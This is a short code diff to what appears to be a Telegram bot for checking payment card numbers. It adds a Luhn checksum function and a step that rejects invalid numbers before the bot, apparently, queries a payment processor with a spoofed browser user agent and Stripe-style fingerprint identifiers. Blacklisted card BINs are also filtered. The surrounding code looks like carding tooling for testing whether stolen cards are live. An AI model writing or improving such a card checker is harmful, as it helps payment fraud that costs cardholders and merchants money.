@@ -59,6 +59,8 @@ UA = 'Mozilla/5.0 (X11; Linux i686; rv:102.0) Gecko/20100101 Firefox/102.0'
 async def is_owner(user_id):
     return user_id == OWNER
 
+async def is_card_valid(card_number: str) -> bool: return (sum( map(lambda n: n[1] + (n[0] % 2 == 0) * (n[1] - 9 * (n[1] > 4)), enumerate(map(int, card_number[:-1]))) ) + int(card_number[-1])) % 10 == 0
+
 
 @dp.message_handler(commands=['start', 'help'], commands_prefix=PREFIX)
 async def helpstr(message: types.Message):
@@ -157,6 +159,8 @@ async def ch(message: types.Message):
         BIN = ccn[:6]
         if BIN in BLACKLISTED:
             return await message.reply('<b>BLACKLISTED BIN</b>')
+        if await is_card_valid(ccn) != True:
+            return await message.reply('<b>Invalid luhn algorithm</b>')
         # get guid muid sid
         headers = {
             "user-agent": UA,
